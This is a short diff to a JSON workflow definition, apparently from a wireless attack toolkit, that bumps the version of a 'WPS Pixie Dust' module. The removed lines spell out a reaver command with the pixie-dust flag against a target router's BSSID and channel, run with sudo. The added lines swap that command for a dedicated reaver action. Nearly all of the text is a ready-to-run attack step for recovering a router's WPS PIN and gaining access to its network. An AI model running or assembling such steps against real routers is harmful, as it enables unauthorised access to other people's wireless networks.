@@ -2,7 +2,7 @@
   "name": "wps_pixie",
   "description": "WPS Pixie Dust attack: offline WPS pin recovery using reaver + pixiewps. Works on vulnerable routers without brute-force.",
   "author": "james-linux",
-  "version": "1.0",
+  "version": "2.0",
   "requires_root": true,
   "steps": [
     {
@@ -28,11 +28,11 @@
     },
     {
       "id": "pixie_dust",
-      "action": "layer.run",
+      "action": "reaver.pixie_dust",
       "params": {
-        "command": "reaver -i {{monitor_interface}} -b {{target_bssid}} -c {{target_channel}} -K 1 -vv",
-        "timeout": 120,
-        "sudo": true
+        "interface": "{{monitor_interface}}",
+        "bssid": "{{target_bssid}}",
+        "channel": "{{target_channel}}"
       },
       "description": "Execute Pixie Dust attack (offline WPS pin recovery)"
     },
